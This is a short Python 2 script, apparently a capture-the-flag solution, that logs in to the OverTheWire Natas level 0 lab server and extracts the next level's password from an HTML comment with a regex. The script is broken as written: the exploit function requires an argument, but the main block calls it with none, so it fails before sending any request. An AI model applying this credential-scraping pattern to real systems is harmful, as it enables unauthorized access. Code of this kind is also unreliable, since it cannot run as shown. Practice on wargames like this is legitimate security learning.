#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import re

def exploit(level0password):
    print "{+} Natas Level 0. Doing magic..."
    try:
        r = requests.get(url="http://natas0.natas.labs.overthewire.org", auth=HTTPBasicAuth('natas0', 'natas0'))
    except Exception:
        print "{-} Something fucked up, request failed. Bailing."
        return None
    password = re.findall("for natas1 is (.*?) -->", r.text)
    if len(password):
        return password[0]
    return None

if __name__ == "__main__":
    level1pass = exploit()
    if level1pass != None:
        print "{$$} Level 1 Password is: %s" %(level1pass)
